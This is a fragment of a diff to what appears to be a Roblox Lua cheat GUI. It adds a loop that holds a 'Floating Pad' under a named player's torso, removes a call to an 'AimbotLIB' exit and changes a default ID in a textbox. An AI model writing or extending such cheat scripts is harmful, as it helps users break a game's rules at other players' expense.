+		m.Parent = p
+		while p ~= nil do
+			p.CFrame = CFrame.new(game.Players:findFirstChild(name).Character.Torso.CFrame.x, game.Players:findFirstChild(name).Character.Torso.CFrame.y - 4, game.Players:findFirstChild(name).Character.Torso.CFrame.z)
+			wait()
 		end
-		
+		print("end")
 	else
 		button.Text = "Off"
-		if AimbotLIB ~= nil then
-			AimbotLIB:Exit()
+		if game.Workspace:FindFirstChild("Floating Pad") ~= nil then
+			game.Workspace:FindFirstChild("Floating Pad"):Remove()
 		end
 	end
 end)
@@ -5839,7 +6188,7 @@ textbox.Size = UDim2.new(1,0,0,30)
 textbox.ZIndex = 1
 textbox.Font = tef
 textbox.FontSize = "Size24"
-textbox.Text = "124106510180382"
+textbox.Text = "139862151069061"
 textbox.TextColor3 = whit
 local label = Instance.new("TextLabel")
 label.Parent = pge2
